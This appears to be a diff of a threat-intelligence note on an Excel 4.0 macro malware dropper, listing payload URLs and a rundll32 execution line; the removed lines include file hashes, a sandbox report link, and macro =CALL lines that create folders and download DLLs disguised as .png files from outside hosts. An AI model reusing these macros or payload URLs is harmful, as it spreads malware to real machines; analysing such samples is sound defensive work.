@@ -4,20 +4,11 @@
 
 .url http://lestore.in/odi/tqufousig
 .url https://speedmove-nin.com/Gw4uMJAkw/H.png
-.xls f1dc179d7a3aeb57b86d939b5b4d116b3b7778f9ac79b11d1c2e5a410436effa
-.dll 1176381ebfc60acd5078c5a6ac4ac5a0defffce6f1a6c1f6fbe830dd2df6c3e6
-.dll bde66b4246cfbb415549464b424ffd581885dc8a2b85cb2d2676ead4d66b64e8
-.dll c9c0e45015785baff7f64720ba9c3ec85e70506cf78a6e25e8f11bc6949aadbb
+.zip
+.dll 
+.dll 
 
 ******************************
-
-=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Vrhgdast", 0)
-=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Vrhgdast\Tfujist", 0)
-=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTPS://depraxis.com.br/qpemoXzi0uV/T.png", "C:\Vrhgdast\Tfujist\Eghejdor.ddllll")
-=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTPS://svtecopro.com/whm1kFH5qoN/T.png", "C:\Vrhgdast\Tfujist\Eghejdor1.ddllll")
-=CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTPS://cardiaccommunity.org/7KpnZDjE3Z/T.png", "C:\Vrhgdast\Tfujist\Eghejdor2.ddllll")
-
-*************************************************
 
 Exec >>
 
@@ -29,7 +20,6 @@ rundll32.exe C:\Users\Admin\AppData\Local\Temp\hguy.dll DllRegisterServer
 
 *************************************************
 
-https://tria.ge/reports/220525-q9tqzaahd9/
 
 *************************************************
 
